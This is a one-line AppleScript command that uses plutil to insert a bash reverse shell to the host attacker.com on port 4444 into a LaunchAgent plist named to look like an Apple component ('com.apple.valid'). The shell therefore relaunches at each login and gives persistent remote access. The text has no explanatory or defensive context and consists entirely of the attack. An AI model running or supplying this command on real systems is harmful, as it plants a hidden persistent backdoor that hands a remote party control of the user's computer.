do shell script "plutil -insert ProgramArguments.2 -string 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' ~/Library/LaunchAgents/com.apple.valid.plist"
